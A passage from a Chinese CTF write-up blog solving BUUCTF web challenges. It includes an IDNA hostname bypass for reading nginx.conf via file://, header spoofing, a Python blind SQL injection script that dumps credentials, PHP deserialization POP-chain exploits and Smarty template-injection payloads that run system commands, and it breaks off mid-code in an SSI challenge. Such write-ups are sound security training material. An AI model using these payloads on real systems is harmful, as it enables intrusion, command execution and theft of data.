</span></span><span class="line"><span class="cl">    <span class="n">newhost</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">h</span> <span class="ow">in</span> <span class="n">host</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">newhost</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">h</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;idna&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="n">parts</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;.&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">newhost</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="c1">#去掉 url 中的空格</span>
</span></span><span class="line"><span class="cl">    <span class="n">finalUrl</span> <span class="o">=</span> <span class="n">urlunsplit</span><span class="p">(</span><span class="n">parts</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="n">host</span> <span class="o">=</span> <span class="n">parse</span><span class="o">.</span><span class="n">urlparse</span><span class="p">(</span><span class="n">finalUrl</span><span class="p">)</span><span class="o">.</span><span class="n">hostname</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">host</span> <span class="o">==</span> <span class="s1">&#39;suctf.cc&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">urllib</span><span class="o">.</span><span class="n">request</span><span class="o">.</span><span class="n">urlopen</span><span class="p">(</span><span class="n">finalUrl</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s2">&#34;我扌 your problem? 333&#34;</span></span></span></code></pre></div><p>进行了三次判断，最后一次过了之后才会执行读取文件的操作。</p>
<p>问题就出现在第二次和第三次判断的中间：<code>newhost.append(h.encode('idna').decode('utf-8'))</code></p>
<p>所以在第三个必须等于suctf.cc</p>
<p>可用payload：</p>
<pre tabindex="0"><code>file://suctf.cℭ/usr/local/nginx/conf/nginx.conf
file://sucⓉf.cc/usr/local/nginx/conf/nginx.conf</code></pre><h2 id="0x35mrctf2020pywebsite" class="heading-element">
  <a href="#0x35mrctf2020pywebsite" class="heading-mark"></a>0x35.[MRCTF2020]PYWebsite</h2><p>看源码发现有前段的验证(没卵用)，flag.php进去之后提示</p>
<pre tabindex="0"><code>&lt;h1&gt;拜托，我也是学过半小时网络安全的，你骗不了我！&lt;/h1&gt;&lt;p&gt;我已经把购买者的IP保存了，显然你没有购买&lt;/p&gt;&lt;p&gt;验证逻辑是在后端的，除了购买者和我自己，没有人可以看到flag&lt;/p&gt;&lt;a href=&#34;index.html&#34; &gt;还不快去买&lt;/p&gt;&lt;</code></pre><p>真正的验证在后端。</p>
<p>购买者和自己，可以伪造成本地访问，加X-Forwarded-For头得到flag</p>
<h2 id="0x36极客大挑战-2019finalsql盲注" class="heading-element">
  <a href="#0x36%e6%9e%81%e5%ae%a2%e5%a4%a7%e6%8c%91%e6%88%98-2019finalsql%e7%9b%b2%e6%b3%a8" class="heading-mark"></a>0x36.[极客大挑战 2019]FinalSQL(盲注)</h2><p>依次点12345，然后测试id=6的时候返回<code>Clever! But not this table.</code>，7以上报error</p>
<p>注入点在id，过滤了一部分内容，盲注，直接上脚本：</p>
<div class="highlight" id="id-13"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;http://b392895c-24a8-4369-9d79-e4d112a0d249.node4.buuoj.cn:81/search.php?id=&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="n">flag</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="cl"><span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">i</span> <span class="o">+=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># 从可打印字符开始</span>
</span></span><span class="line"><span class="cl">    <span class="n">begin</span> <span class="o">=</span> <span class="mi">32</span>
</span></span><span class="line"><span class="cl">    <span class="n">end</span> <span class="o">=</span> <span class="mi">126</span>
</span></span><span class="line"><span class="cl">    <span class="n">tmp</span> <span class="o">=</span> <span class="p">(</span><span class="n">begin</span> <span class="o">+</span> <span class="n">end</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span>
</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="n">begin</span> <span class="o">&lt;</span> <span class="n">end</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="c1">#print(begin, tmp, end)</span>
</span></span><span class="line"><span class="cl">        <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># 爆数据库:geek</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># payload = &#34;&#39;&#39;or(ascii(substr(database(),%d,1))&gt;%d)&#34; % (i, tmp)</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># 爆表: F1naI1y,Flaaaaag</span>
</span></span><span class="line"><span class="cl">        <span class="c1">#payload = &#34;&#39;&#39;or(ascii(substr((select(GROUP_CONCAT(TABLE_NAME))from(information_schema.tables)where(TABLE_SCHEMA=database())),%d,1))&gt;%d)&#34; % (i, tmp)</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># 爆字段</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># F1naI1y: id,username,password</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># Flaaaaag:id,fl4gawsl</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># payload = &#34;&#39;&#39;or(ascii(substr((select(GROUP_CONCAT(COLUMN_NAME))from(information_schema.COLUMNS)where(TABLE_NAME=&#39;Flaaaaag&#39;)),%d,1))&gt;%d)&#34; % (i, tmp)</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># 爆flag 要跑很久</span>
</span></span><span class="line"><span class="cl">        <span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;&#39;&#39;or(ascii(substr((select(group_concat(username))from(F1naI1y)),</span><span class="si">%d</span><span class="s2">,1))&gt;</span><span class="si">%d</span><span class="s2">)&#34;</span> <span class="o">%</span> <span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">tmp</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># 爆flag 很快</span>
</span></span><span class="line"><span class="cl">        <span class="c1">#payload = &#34;&#39;&#39;or(ascii(substr((select(password)from(F1naI1y)where(username=&#39;flag&#39;)),%d,1))&gt;%d)&#34; % (i, tmp)</span>
</span></span><span class="line"><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="o">+</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="s1">&#39;Click&#39;</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">begin</span> <span class="o">=</span> <span class="n">tmp</span> <span class="o">+</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">            <span class="n">tmp</span> <span class="o">=</span> <span class="p">(</span><span class="n">begin</span> <span class="o">+</span> <span class="n">end</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">end</span> <span class="o">=</span> <span class="n">tmp</span>
</span></span><span class="line"><span class="cl">            <span class="n">tmp</span> <span class="o">=</span> <span class="p">(</span><span class="n">begin</span> <span class="o">+</span> <span class="n">end</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">flag</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">tmp</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">begin</span> <span class="o">==</span> <span class="mi">32</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">break</span></span></span></code></pre></div><p>password里面垃圾东西很多，可以先查username然后查password</p>
<h2 id="0x37mrctf2020ezpop" class="heading-element">
  <a href="#0x37mrctf2020ezpop" class="heading-mark"></a>0x37.[MRCTF2020]Ezpop</h2><div class="highlight" id="id-14"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">Welcome</span> <span class="nx">to</span> <span class="nx">index</span><span class="o">.</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="c1">//flag is in flag.php
</span></span></span><span class="line"><span class="cl"><span class="c1">//WTF IS THIS?
</span></span></span><span class="line"><span class="cl"><span class="c1">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95
</span></span></span><span class="line"><span class="cl"><span class="c1">//And Crack It!
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">class</span> <span class="nc">Modifier</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">protected</span>  <span class="nv">$var</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">append</span><span class="p">(</span><span class="nv">$value</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="k">include</span><span class="p">(</span><span class="nv">$value</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__invoke</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">append</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">var</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Show</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$source</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$str</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$file</span><span class="o">=</span><span class="s1">&#39;index.php&#39;</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">source</span> <span class="o">=</span> <span class="nv">$file</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s1">&#39;Welcome to &#39;</span><span class="o">.</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">source</span><span class="o">.</span><span class="s2">&#34;&lt;br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__toString</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">str</span><span class="o">-&gt;</span><span class="na">source</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__wakeup</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/gopher|http|file|ftp|https|dict|\.\./i&#34;</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">source</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s2">&#34;hacker&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">source</span> <span class="o">=</span> <span class="s2">&#34;index.php&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Test</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$p</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">p</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__get</span><span class="p">(</span><span class="nv">$key</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$function</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">p</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$function</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;pop&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="cl">    <span class="o">@</span><span class="nx">unserialize</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;pop&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$a</span><span class="o">=</span><span class="k">new</span> <span class="nx">Show</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><div class="highlight" id="id-15"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">__construct</span><span class="p">()</span><span class="c1">//当一个对象创建时被调用
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">__destruct</span><span class="p">()</span> <span class="c1">//当一个对象销毁时被调用
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">__toString</span><span class="p">()</span> <span class="c1">//当一个对象被当作一个字符串使用
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">__sleep</span><span class="p">()</span><span class="c1">//在对象在被序列化之前运行
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">__wakeup</span><span class="p">()</span><span class="c1">//将在反序列化之后立即被调用(通过序列化对象元素个数不符来绕过)
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">__get</span><span class="p">()</span><span class="c1">//访问类中一个不存在的属性时自动调用
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">__set</span><span class="p">()</span><span class="c1">//设置一个类的成员变量时调用
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">__invoke</span><span class="p">()</span><span class="c1">//调用函数的方式调用一个对象时的回应方法
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">__call</span><span class="p">()</span><span class="c1">//当调用一个对象中的不能用的方法的时候就会执行这个函数
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">此处用到的主要是__toString</span><span class="p">()</span><span class="nx">，__wakeup</span><span class="p">()</span><span class="nx">，__get</span><span class="p">()</span><span class="nx">，__invoke</span><span class="p">()</span><span class="nx">，</span></span></span></code></pre></div><p>首先是Modifier类，append可以包含文件，<code>__invoke</code>中调用了append方法，<code>__invoke</code>自动调用的条件是类被当做一个函数被调用。</p>
<p>接下来是Test，construct用不上 ，直接看get，可以看到p被当做函数来调用，正好符合Modifier的要求。魔法函数__get会在访问类中一个不存在的属性时自动调用。</p>
<p>然后是Show类，魔术方法__toString中会返回属性str中的属性source，如果刚刚提到的source属性不存在，那么就符合了Test类中的要求，魔术方法__toString在类被当做一个字符串处理时会被自动调用。</p>
<p>wakewp将source传入正则进行匹配，这时source被当做字符串来处理，最终会调用tostring方法</p>
<p>于是：<code>反序列化-&gt; show.__wakeup-&gt; show.tostring-&gt;test.get-&gt;modiflier.invoke-&gt;include</code></p>
<p>exp:</p>
<div class="highlight" id="id-16"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Modifier</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="c1">///protected  $var=&#34;flag.php&#34;;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="k">protected</span> <span class="nv">$var</span><span class="o">=</span><span class="s2">&#34;php://filter/read=convert.base64-encode/resource=flag.php&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Show</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$source</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$str</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Test</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$p</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Show</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="nv">$b</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Show</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">-&gt;</span><span class="na">source</span><span class="o">=</span><span class="nv">$b</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$b</span><span class="o">-&gt;</span><span class="na">str</span><span class="o">=</span><span class="k">new</span> <span class="nx">Test</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="nv">$b</span><span class="o">-&gt;</span><span class="na">str</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">p</span><span class="o">=</span><span class="k">new</span> <span class="nx">Modifier</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">urlencode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">));</span> 
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><h2 id="0x38npuctf2020readlezphp" class="heading-element">
  <a href="#0x38npuctf2020readlezphp" class="heading-mark"></a>0x38.[NPUCTF2020]ReadlezPHP</h2><div class="highlight" id="id-17"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="c1">##error_reporting(0);
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">class</span> <span class="nc">HelloPhp</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$a</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$b</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">a</span> <span class="o">=</span> <span class="s2">&#34;Y-m-d h:i:s&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">b</span> <span class="o">=</span> <span class="s2">&#34;date&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$a</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">a</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$b</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">b</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="nv">$b</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nv">$c</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">HelloPhp</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;source&#39;</span><span class="p">]))</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="o">@</span><span class="nv">$ppp</span> <span class="o">=</span> <span class="nx">unserialize</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;data&#34;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl"><span class="mi">2021</span><span class="o">-</span><span class="mi">10</span><span class="o">-</span><span class="mo">05</span> <span class="mi">10</span><span class="o">:</span><span class="mi">21</span><span class="o">:</span><span class="mo">03</span></span></span></code></pre></div><p>可以直接命令执行：</p>
<div class="highlight" id="id-18"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">HelloPhp</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$b</span><span class="o">=</span><span class="s2">&#34;assert&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$a</span><span class="o">=</span><span class="s2">&#34;phpinfo()&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$a</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">a</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$b</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">b</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="nv">$b</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nv">$c</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">HelloPhp</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><h2 id="0x39ciscn2019-华东南赛区web11ssti" class="heading-element">
  <a href="#0x39ciscn2019-%e5%8d%8e%e4%b8%9c%e5%8d%97%e8%b5%9b%e5%8c%baweb11ssti" class="heading-mark"></a>0x39.[CISCN2019 华东南赛区]Web11(SSTI)</h2><p><img loading="lazy" src="/posts/buu-web-0x30-0x3f/image-20211005183401519.png" alt="image-20211005183401519" srcset="/posts/buu-web-0x30-0x3f/image-20211005183401519.png?size=small, /posts/buu-web-0x30-0x3f/image-20211005183401519.png?size=medium 1.5x, /posts/buu-web-0x30-0x3f/image-20211005183401519.png?size=large 2x" data-title="image-20211005183401519" style="--width: 850px;--aspect-ratio: 850 / 500;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>抓包改下xff，确实有用。</p>
<p>看了wp说是Smarty SSTI，Smarty 是一个 PHP 的模板引擎。</p>
<p>查看 Smarty 版本：</p>
<pre tabindex="0"><code>{$smarty.version}</code></pre><p><strong>漏洞利用</strong></p>
<p>不同版本可以利用的方式不同，常用的有以下三种方法：</p>
<p>1.旧版 Smarty 支持使用{php}{/php}标签来执行被包裹其中的 php 指令。</p>
<p>Smarty3 的官方手册描述：</p>
<pre tabindex="0"><code>Smarty已经废弃{php}标签，强烈建议不要使用。在Smarty 3.1，{php}仅在SmartyBC中可用</code></pre><p>2.旧版 Smarty 可以通过 self 获取 Smarty 类再调用其静态方法实现文件读写</p>
<p>3.PHP 函数都可以在模板中使用，因此注入时，可以直接使用：</p>
<pre tabindex="0"><code>{system(&#39;ls&#39;)}</code></pre><p>便可随意执行命令；执行多条语句的话可以使用下面的形式：</p>
<pre tabindex="0"><code>{system(&#39;ls&#39;)}{system(&#39;cat index.php&#39;)}</code></pre><p>每个{if}必须有一个配对的{/if}. 也可以使用{else} 和 {elseif}. 全部的PHP条件表达式和函数都可以在if内使用。
也就是说我们把php代码写在<code>{if PHP代码}{/if}</code> 就可以了，PHP代码可以被执行。</p>
<p>payload有很多：</p>
<pre tabindex="0"><code>{if show_source(&#39;/flag&#39;)}{/if}
{readfile(&#39;/flag&#39;)}
{if system(&#39;cat /flag&#39;)}{/if}</code></pre><h2 id="0x3abjdctf2020easysearch" class="heading-element">
  <a href="#0x3abjdctf2020easysearch" class="heading-mark"></a>0x3A.[BJDCTF2020]EasySearch</h2><blockquote>
<p>SSI(Server Side Includes)注入漏洞</p>
</blockquote>
<div class="highlight" id="id-24"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">	<span class="nx">ob_start</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">	<span class="k">function</span> <span class="nf">get_hash</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">		<span class="nv">$chars</span> <span class="o">=</span> <span class="s1">&#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="nv">$random</span> <span class="o">=</span> <span class="nv">$chars</span><span class="p">[</span><span class="nx">mt_rand</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">73</span><span class="p">)]</span><span class="o">.</span><span class="nv">$chars</span><span class="p">[</span><span class="nx">mt_rand</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">73</span><span class="p">)]</span><span class="o">.</span><span class="nv">$chars</span><span class="p">[</span><span class="nx">mt_rand</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">73</span><span class="p">)]</span><span class="o">.</span><span class="nv">$chars</span><span class="p">[</span><span class="nx">mt_rand</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">73</span><span class="p">)]</span><span class="o">.</span><span class="nv">$chars</span><span class="p">[</span><span class="nx">mt_rand</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">73</span><span class="p">)];</span><span class="c1">//Random 5 times
